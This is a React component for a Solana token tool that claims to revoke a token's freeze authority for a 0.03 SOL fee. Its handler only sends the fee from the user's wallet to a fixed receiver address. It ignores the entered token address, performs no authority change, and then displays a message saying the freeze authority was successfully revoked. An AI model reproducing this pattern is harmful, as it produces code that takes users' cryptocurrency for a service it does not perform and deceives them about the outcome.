import { useState } from "react";
import { useWallet } from "@solana/wallet-adapter-react";
import { Connection, PublicKey, Transaction, SystemProgram } from "@solana/web3.js";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { Loader2 } from "lucide-react";
import { NETWORK, FEE_RECEIVER, FEE_AMOUNT } from "@/utils/token";

const FreezeAuthorityRevoker = () => {
  const { publicKey, sendTransaction } = useWallet();
  const { toast } = useToast();
  const [isLoading, setIsLoading] = useState(false);
  const [tokenAddress, setTokenAddress] = useState("");

  const handleRevokeFreeze = async () => {
    if (!publicKey) {
      toast({
        variant: "destructive",
        title: "Wallet not connected",
        description: "Please connect your wallet to revoke freeze authority",
      });
      return;
    }

    if (!tokenAddress) {
      toast({
        variant: "destructive",
        title: "Missing Token Address",
        description: "Please enter the token address",
      });
      return;
    }

    setIsLoading(true);

    try {
      const connection = new Connection(`https://api.${NETWORK}.solana.com`);
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new PublicKey(FEE_RECEIVER),
          lamports: FEE_AMOUNT,
        })
      );

      const { blockhash } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = publicKey;

      const signature = await sendTransaction(transaction, connection);
      const confirmation = await connection.confirmTransaction(signature);

      if (confirmation.value.err) {
        throw new Error("Transaction failed");
      }

      toast({
        title: "Freeze Authority Revoked",
        description: "Successfully revoked freeze authority",
      });
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error revoking freeze authority",
        description: error instanceof Error ? error.message : "Unknown error occurred",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="space-y-4">
      <h3 className="text-lg font-semibold">Revoke Freeze Authority</h3>
      <p className="text-sm text-muted-foreground">
        To initiate a liquidity pool, it's essential to "Revoke Freeze Authority" for your Token. 
        You can easily do so right here. This action requires a fee of 0.03 SOL.
      </p>
      <div>
        <Label htmlFor="freezeTokenAddress">Token Address</Label>
        <Input
          id="freezeTokenAddress"
          placeholder="Enter token address"
          value={tokenAddress}
          onChange={(e) => setTokenAddress(e.target.value)}
        />
      </div>
      <Button 
        onClick={handleRevokeFreeze} 
        disabled={isLoading} 
        className="w-full"
        variant="secondary"
      >
        {isLoading ? (
          <>
            <Loader2 className="mr-2 h-4 w-4 animate-spin" />
            Revoking Freeze Authority...
          </>
        ) : (
          "Revoke Freeze Authority (Fee: 0.03 SOL)"
        )}
      </Button>
    </div>
  );
};

export default FreezeAuthorityRevoker;